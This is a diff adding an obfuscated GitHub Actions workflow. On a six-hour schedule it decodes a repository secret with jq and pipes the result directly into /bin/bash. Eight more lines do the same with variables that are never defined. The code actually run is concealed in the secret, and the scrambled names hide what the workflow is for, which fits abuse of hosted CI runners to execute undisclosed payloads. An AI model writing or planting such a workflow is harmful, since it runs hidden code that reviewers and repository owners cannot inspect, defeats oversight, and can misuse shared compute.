@@ -1,0 +1,26 @@
+name: yikaocebann
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yikaocebann
+        env:
+          wbfc5388: ${{ secrets.wbfc5388 }}
+        run: |
+          echo $wbfc5388 | jq -r .ktof094 | /bin/bash
+          echo $cdgg1833 | jq -r .zvqe8 | /bin/bash
+          echo $u8247 | jq -r .i2939 | /bin/bash
+          echo $nmnop9 | jq -r .ethu15758 | /bin/bash
+          echo $az39558 | jq -r .gtzq09382 | /bin/bash
+          echo $onp77175 | jq -r .llkm3274 | /bin/bash
+          echo $bviob78943 | jq -r .qtavw22 | /bin/bash
+          echo $x4761 | jq -r .koq97 | /bin/bash
+          echo $dyp651 | jq -r .xj7009 | /bin/bash
+
